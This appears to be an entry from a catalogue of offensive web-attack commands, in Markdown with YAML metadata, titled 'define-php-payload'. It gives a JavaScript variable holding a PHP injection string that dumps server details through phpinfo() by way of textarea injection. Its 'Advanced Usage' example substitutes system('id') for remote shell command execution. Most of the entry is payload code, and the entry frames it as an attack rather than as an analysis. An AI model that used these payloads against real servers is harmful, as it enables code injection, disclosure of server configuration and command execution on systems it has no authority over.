---
data: var p = "<?php phpinfo(); ?>";
tags:
  - php
  - payload
type: command
executor: javascript
platforms:
  - Web
id: 059f3499-16e8-45e3-aa04-234f16e23d03
created_at: '2025-12-14T17:23:20.671Z'
updated_at: '2025-12-14T17:23:20.671Z'
verified: false
validated: true
submitted: true
---
# define-php-payload

## Command

```javascript
var p = "<?php phpinfo(); ?>";
```

## Description

This JavaScript command defines a variable holding a PHP code string for injection, used to dump server information via phpinfo() when executed on the server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| p | Variable name for the PHP string | Yes |
| "<?php phpinfo(); ?>" | The PHP payload content | Yes |

## Examples

### Basic Usage

```javascript
var p = "<?php phpinfo(); ?>";
```

### Advanced Usage

```javascript
var p = "<?php system('id'); ?>"; // For shell command execution
```

## Expected Output

No direct output; the variable p is set for later use in textarea injection. When executed on server, outputs PHP environment details.

## Related

- [[Related Procedure]]
